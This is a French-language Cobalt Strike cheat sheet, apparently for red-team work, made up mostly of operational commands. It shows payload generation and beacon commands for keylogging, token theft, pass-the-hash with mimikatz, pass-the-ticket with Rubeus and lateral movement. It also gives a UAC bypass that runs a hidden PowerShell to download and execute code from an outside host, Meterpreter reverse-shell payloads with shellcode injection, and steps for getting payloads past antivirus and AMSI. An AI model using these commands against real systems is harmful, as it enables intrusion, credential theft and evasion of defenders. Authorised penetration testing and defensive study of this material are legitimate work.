# Cobalt Strike

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit` puis vous pouvez sélectionner où écouter, quel type de beacon utiliser (http, dns, smb...) et plus encore.

### Peer2Peer Listeners

Les beacons de ces listeners n'ont pas besoin de communiquer directement avec le C2, ils peuvent communiquer avec lui via d'autres beacons.

`Cobalt Strike -> Listeners -> Add/Edit` puis vous devez sélectionner les beacons TCP ou SMB

* Le **beacon TCP va définir un listener sur le port sélectionné**. Pour se connecter à un beacon TCP, utilisez la commande `connect <ip> <port>` depuis un autre beacon.
* Le **beacon smb écoutera dans un pipename avec le nom sélectionné**. Pour se connecter à un beacon SMB, vous devez utiliser la commande `link [target] [pipe]`.

### Generate & Host payloads

#### Generate payloads in files

`Attacks -> Packages ->`

* **`HTMLApplication`** pour les fichiers HTA
* **`MS Office Macro`** pour un document office avec une macro
* **`Windows Executable`** pour un .exe, .dll ou service .exe
* **`Windows Executable (S)`** pour un **stageless** .exe, .dll ou service .exe (mieux stageless que staged, moins d'IoCs)

#### Generate & Host payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` Cela générera un script/exécutable pour télécharger le beacon depuis cobalt strike dans des formats tels que : bitsadmin, exe, powershell et python.

#### Host Payloads

Si vous avez déjà le fichier que vous souhaitez héberger sur un serveur web, allez simplement à `Attacks -> Web Drive-by -> Host File` et sélectionnez le fichier à héberger et la configuration du serveur web.

### Beacon Options

<pre class="language-bash"><code class="lang-bash"># Exécuter un binaire .NET local
execute-assembly </path/to/executable.exe>

# Captures d'écran
printscreen    # Prendre une seule capture d'écran via la méthode PrintScr
screenshot     # Prendre une seule capture d'écran
screenwatch    # Prendre des captures d'écran périodiques du bureau
## Allez à View -> Screenshots pour les voir

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes pour voir les touches pressées

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Injecter l'action de scan de port à l'intérieur d'un autre processus
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
# Importer le module Powershell
powershell-import C:\path\to\PowerView.ps1
powershell <just write powershell cmd here>

# Usurpation d'identité utilisateur
## Génération de token avec des identifiants
make_token [DOMAIN\user] [password] #Créer un token pour usurper un utilisateur dans le réseau
ls \\computer_name\c$ # Essayer d'utiliser le token généré pour accéder à C$ sur un ordinateur
rev2self # Arrêter d'utiliser le token généré avec make_token
## L'utilisation de make_token génère l'événement 4624 : Un compte a été connecté avec succès. Cet événement est très courant dans un domaine Windows, mais peut être restreint en filtrant sur le type de connexion. Comme mentionné ci-dessus, il utilise LOGON32_LOGON_NEW_CREDENTIALS qui est de type 9.

# Bypass UAC
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Voler le token depuis pid
## Comme make_token mais en volant le token d'un processus
steal_token [pid] # De plus, cela est utile pour les actions réseau, pas pour les actions locales
## D'après la documentation de l'API, nous savons que ce type de connexion "permet à l'appelant de cloner son token actuel". C'est pourquoi la sortie du Beacon dit Usurpé <current_username> - il usurpe notre propre token cloné.
ls \\computer_name\c$ # Essayer d'utiliser le token généré pour accéder à C$ sur un ordinateur
rev2self # Arrêter d'utiliser le token de steal_token

## Lancer un processus avec de nouvelles identifiants
spawnas [domain\username] [password] [listener] #Faites-le depuis un répertoire avec un accès en lecture comme : cd C:\
## Comme make_token, cela générera l'événement Windows 4624 : Un compte a été connecté avec succès mais avec un type de connexion de 2 (LOGON32_LOGON_INTERACTIVE). Cela détaillera l'utilisateur appelant (TargetUserName) et l'utilisateur usurpé (TargetOutboundUserName).

## Injecter dans un processus
inject [pid] [x64|x86] [listener]
## D'un point de vue OpSec : Ne pas effectuer d'injection inter-plateforme à moins que cela ne soit vraiment nécessaire (par exemple x86 -> x64 ou x64 -> x86).

## Pass the hash
## Ce processus de modification nécessite un patchage de la mémoire LSASS, ce qui est une action à haut risque, nécessite des privilèges d'administrateur local et n'est pas toujours viable si le Processus Protégé Léger (PPL) est activé.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash via mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Sans /run, mimikatz lance un cmd.exe, si vous exécutez en tant qu'utilisateur avec un Bureau, il verra le shell (si vous exécutez en tant que SYSTEM, vous êtes bon pour y aller)
steal_token <pid> #Voler le token du processus créé par mimikatz

## Pass the ticket
## Demander un ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Créer une nouvelle session de connexion à utiliser avec le nouveau ticket (pour ne pas écraser celui compromis)
make_token <domain>\<username> DummyPass
## Écrire le ticket sur la machine de l'attaquant depuis une session poweshell & le charger
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket depuis SYSTEM
## Générer un nouveau processus avec le ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Voler le token de ce processus
steal_token <pid>

## Extraire le ticket + Pass the ticket
### Lister les tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump le ticket intéressant par luid
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Créer une nouvelle session de connexion, noter luid et processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insérer le ticket dans la session de connexion générée
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Enfin, voler le token de ce nouveau processus
steal_token <pid>

# Mouvement latéral
## Si un token a été créé, il sera utilisé
jump [method] [target] [listener]
## Méthodes :
## psexec                    x86   Utiliser un service pour exécuter un artefact Service EXE
## psexec64                  x64   Utiliser un service pour exécuter un artefact Service EXE
## psexec_psh                x86   Utiliser un service pour exécuter une ligne de commande PowerShell
## winrm                     x86   Exécuter un script PowerShell via WinRM
## winrm64                   x64   Exécuter un script PowerShell via WinRM

remote-exec [method] [target] [command]
## Méthodes :
<strong>## psexec                          Exécution à distance via le Gestionnaire de Contrôle de Service
</strong>## winrm                           Exécution à distance via WinRM (PowerShell)
## wmi                             Exécution à distance via WMI

## Pour exécuter un beacon avec wmi (ce n'est pas dans la commande jump) il suffit de télécharger le beacon et de l'exécuter
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Passer la session à Metasploit - Via listener
## Sur l'hôte metaploit
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## Sur cobalt : Listeners > Ajouter et définir le Payload sur Foreign HTTP. Définissez l'Hôte sur 10.10.5.120, le Port sur 8080 et cliquez sur Enregistrer.
beacon> spawn metasploit
## Vous ne pouvez lancer que des sessions Meterpreter x86 avec le listener étranger.

# Passer la session à Metasploit - Via injection de shellcode
## Sur l'hôte metasploit
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Exécutez msfvenom et préparez le listener multi/handler

## Copier le fichier bin sur l'hôte cobalt strike
ps
shinject <pid> x64 C:\Payloads\msf.bin #Injecter le shellcode metasploit dans un processus x64

# Passer la session metasploit à cobalt strike
## Générer le shellcode Beacon stageless, allez à Attacks > Packages > Windows Executable (S), sélectionnez le listener souhaité, sélectionnez Raw comme type de sortie et sélectionnez Utiliser le payload x64.
## Utilisez post/windows/manage/shellcode_inject dans metasploit pour injecter le shellcode cobalt strike généré.


# Pivoting
## Ouvrir un proxy socks dans le teamserver
beacon> socks 1080

# Connexion SSH
beacon> ssh 10.10.17.12:22 username password</code></pre>

## Éviter les AVs

### Artifact Kit

Généralement dans `/opt/cobaltstrike/artifact-kit`, vous pouvez trouver le code et les modèles pré-compilés (dans `/src-common`) des payloads que cobalt strike va utiliser pour générer les beacons binaires.

En utilisant [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) avec la porte dérobée générée (ou juste avec le modèle compilé), vous pouvez trouver ce qui fait déclencher le défenseur. C'est généralement une chaîne. Par conséquent, vous pouvez simplement modifier le code qui génère la porte dérobée afin que cette chaîne n'apparaisse pas dans le binaire final.

Après avoir modifié le code, exécutez simplement `./build.sh` depuis le même répertoire et copiez le dossier `dist-pipe/` dans le client Windows à `C:\Tools\cobaltstrike\ArtifactKit`.
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
N'oubliez pas de charger le script agressif `dist-pipe\artifact.cna` pour indiquer à Cobalt Strike d'utiliser les ressources du disque que nous voulons et non celles chargées.

### Resource Kit

Le dossier ResourceKit contient les modèles pour les charges utiles basées sur des scripts de Cobalt Strike, y compris PowerShell, VBA et HTA.

En utilisant [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) avec les modèles, vous pouvez trouver ce que le défenseur (AMSI dans ce cas) n'aime pas et le modifier :
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
Modifier les lignes détectées permet de générer un modèle qui ne sera pas détecté.

N'oubliez pas de charger le script agressif `ResourceKit\resources.cna` pour indiquer à Cobalt Strike d'utiliser les ressources du disque que nous voulons et non celles chargées.
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```

